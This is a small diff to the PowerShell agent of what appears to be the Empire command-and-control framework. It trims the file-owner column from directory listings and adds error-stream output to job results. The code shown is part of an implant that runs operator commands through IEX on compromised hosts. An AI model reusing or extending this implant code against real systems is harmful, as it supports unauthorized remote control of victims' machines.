@@ -281,11 +281,11 @@ function Invoke-Empire {
             switch -regex ($cmd) {
                 '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,lastwritetime,length,name
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name"
+                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
                         }
                         catch [System.Management.Automation.ActionPreferenceStopException] {
                             $output = "[!] Error: $_ (or cannot be accessed)."
@@ -441,6 +441,8 @@ function Invoke-Empire {
         param($JobName)
         if($Script:Jobs.ContainsKey($JobName)) {
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
         }
     }
 
@@ -453,6 +455,8 @@ function Invoke-Empire {
             $Null = $Script:Jobs[$JobName]['PSHost'].Stop()
             # get results
             $Script:Jobs[$JobName]['Buffer'].ReadAll()
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error
+            $Script:Jobs[$JobName]['PSHost'].Streams.Error.Clear()
             # unload the app domain runner
             $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain'])
             $Script:Jobs.Remove($JobName)
